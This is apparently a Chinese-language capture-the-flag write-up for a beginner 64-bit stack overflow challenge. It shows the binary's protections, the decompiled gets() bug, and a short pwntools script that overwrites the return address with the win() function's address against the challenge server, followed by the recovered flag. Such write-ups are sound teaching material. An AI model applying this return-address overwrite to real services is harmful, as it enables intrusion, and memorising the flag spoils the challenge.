



最基本的栈溢出。

查看基本信息：64位，未启用canary。

```bash
$ file bof1
bof1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5af1341362fe21b5386b4a77b63b43da6a508b2e, for GNU/Linux 3.2.0, not stripped

$ checksec bof1
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



IDA反编译，得到漏洞代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  puts("I will let you overflow me");
  gets(format);  // gets函数，未检查输入字符串长度。字符串format只有32个字节。存在栈溢出漏洞。
  return printf(format);
}
```

另外还有win函数。

```c
void __noreturn win()
{
  system("cat flag.txt");  # TAB键找到对应的地址： 0x401176
  exit(-1);
}
```



payload思路：

```
pl = 'A'*(format变量的栈长度 + rsp即8字节长度) + 返回地址（即win函数地址）
```





直接利用代码：

```python
from pwn import *

win_addr = 0x401176
pl = b'A'*(0x20+8) + p64(win_addr)

h,p = "freefall.chall.winja.site", 18967
io = remote(h,p)
print(io.recvuntil(b"I will let you overflow me").decode(), end='')
print(pl)
io.sendline(pl)
io.interactive()
# flag{7fbec6d149f9878499b4acd05e06c692_Did_B4BY_MaK3_YOu_OVeRCrY}
```

